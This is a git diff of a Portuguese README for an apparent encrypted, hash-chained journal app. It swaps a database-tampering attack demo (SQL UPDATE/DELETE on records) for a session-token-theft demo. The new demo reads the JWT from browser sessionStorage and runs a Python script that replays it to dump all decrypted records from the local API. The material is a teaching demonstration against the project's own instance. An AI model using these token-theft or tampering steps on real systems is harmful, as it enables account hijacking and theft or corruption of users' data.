@@ -119,42 +119,54 @@ docker compose exec backend python -m pytest -v
 
 ## Demonstracao do ataque
 
-O ataque demonstra que um adversario com acesso directo a base de dados nao consegue alterar registos sem ser detectado.
+O ataque e de **roubo de token de sessao** (*session token theft*). Um adversario que obtenha o JWT de um utilizador consegue ler todos os registos em texto limpo — sem conhecer a palavra-passe, sem aceder a base de dados e sem quebrar qualquer primitiva criptografica.
 
 **1. Preparar dados**
 - Registar um utilizador
-- Criar pelo menos tres registos
-- Confirmar em `/records` que todos os blocos estao validos
+- Criar pelo menos tres registos com conteudo realista
+- Confirmar em `/records` que todos os registos aparecem decifrados e validos
 
-**2. Aceder directamente ao PostgreSQL**
+**2. Descobrir os endpoints**
 
-```powershell
-docker exec -it canttouchme-db psql -U canttouchme -d canttouchme
+A API tem documentacao publica sem autenticacao em `http://localhost:8000/docs`. O endpoint `GET /records?page_size=50` esta visivel com todos os parametros e o schema de resposta.
+
+**3. Roubar o token de sessao**
+
+Com a sessao ativa, abrir as DevTools do browser (`F12`) e na consola executar:
+
+```javascript
+const token = sessionStorage.getItem('canttouchme_token');
+console.log(token);
 ```
 
-**3. Alterar um bloco antigo** (escolher uma opcao)
+Copiar o valor — comeca por `eyJ`.
 
-```sql
--- Opcao A: corromper o ciphertext
-UPDATE records SET ciphertext = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==' WHERE block_index = 1;
+**4. Exfiltrar todos os registos**
 
--- Opcao B: apagar um bloco intermedio
-DELETE FROM records WHERE block_index = 2;
+```python
+import requests
 
--- Opcao C: falsificar o previous_hash
-UPDATE records SET previous_hash = 'FALSIFICADO' WHERE block_index = 2;
+TOKEN = "eyJ..."  # colar o token aqui
+
+r = requests.get(
+    "http://localhost:8000/records?page_size=50",
+    headers={"Authorization": f"Bearer {TOKEN}"},
+)
+
+dados = r.json()
+print(f"Total de registos: {dados['total']}\n")
+
+for reg in dados["records"]:
+    print(f"--- Bloco {reg['block_index']} ({reg['timestamp']}) ---")
+    print(reg["text"])
+    print()
 ```
 
-```sql
-\q
-```
+**5. Resultado esperado**
+- O script imprime todos os registos em texto limpo
+- O atacante le o diario completo sem saber a palavra-passe, sem tocar na base de dados e sem invalidar a blockchain
 
-**4. Resultado esperado**
-- O bloco alterado aparece como invalido em `/records`
-- Os blocos seguintes aparecem como `chain_affected`
-- `/chain-status` mostra a cadeia como invalida
-
-Ver [docs/attack_demo.md](docs/attack_demo.md) para mais detalhes.
+Ver [docs/attack_demo.md](docs/attack_demo.md) para detalhes completos, vetores reais de obtencao do token e demonstracao com dois browsers.
 
 ---
 
